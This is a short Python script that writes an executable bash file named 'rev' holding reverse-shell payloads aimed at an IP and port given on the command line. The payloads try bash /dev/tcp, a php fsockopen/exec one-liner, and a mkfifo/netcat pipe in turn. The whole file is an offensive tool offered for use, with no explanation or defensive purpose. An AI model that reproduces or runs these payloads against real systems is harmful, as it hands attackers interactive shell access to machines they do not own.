#!/usr/bin/python
#Author: sidious
import os
import sys

ip = sys.argv[1]
port = sys.argv[2]
print("selected ip:",ip,"and port:",port)  

def shell():
	file = open("rev", "w")
	file.write("#!/bin/bash\n\n")
	file.write("if command -v bash > /dev/null 2>&1; then\n")
	file.write("  bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n")
	file.write("  exit;\n")
	file.write("fi\n\n")
	file.write("if command -v php > /dev/null 2>&1; then\n")
	file.write("  php -r '$sock=fsockopen("+ip+","+port+");exec('/bin/sh -i <&3 >&3 2>&3');'\n")
	file.write("  exit;\n")
	file.write("fi\n\n")
	file.write("if command -v nc > /dev/null 2>&1; then\n")
	file.write("  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f \n")
	file.write("  exit;\n")
	file.write("fi\n\n")
	file.close()

def foofile():
	os.popen("chmod +x rev")

shell()
foofile()
